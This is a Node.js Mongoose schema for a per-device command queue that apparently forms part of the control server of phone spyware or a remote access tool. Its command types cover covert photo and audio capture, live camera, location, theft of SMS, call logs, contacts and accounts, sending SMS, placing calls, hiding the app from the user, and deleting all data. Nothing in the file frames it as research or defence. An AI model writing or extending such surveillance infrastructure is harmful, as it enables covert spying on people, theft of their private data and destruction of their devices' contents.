const mongoose = require('mongoose');

const commandSchema = new mongoose.Schema({
  deviceId: {
    type: String,
    required: true,
    index: true,
  },
  type: {
    type: String,
    enum: [
      'capture_photo_front',
      'capture_photo_back',
      'record_audio',
      'get_location',
      'get_sms',
      'get_call_logs',
      'get_contacts',
      'get_installed_apps',
      'get_accounts',
      'get_storage_info',
      'upload_photo',
      'upload_video',
      'start_live_camera',
      'stop_live_camera',
      'hide_app',
      'unhide_app',
      'send_sms',
      'make_call',
      'delete_all_data',
    ],
    required: true,
  },
  status: {
    type: String,
    enum: ['pending', 'sent', 'completed', 'failed'],
    default: 'pending',
  },
  params: {
    type: mongoose.Schema.Types.Mixed,
    default: {},
  },
  result: {
    type: mongoose.Schema.Types.Mixed,
    default: null,
  },
  createdAt: {
    type: Date,
    default: Date.now,
  },
  completedAt: {
    type: Date,
  },
});

commandSchema.index({ deviceId: 1, createdAt: -1 });

module.exports = mongoose.model('Command', commandSchema);

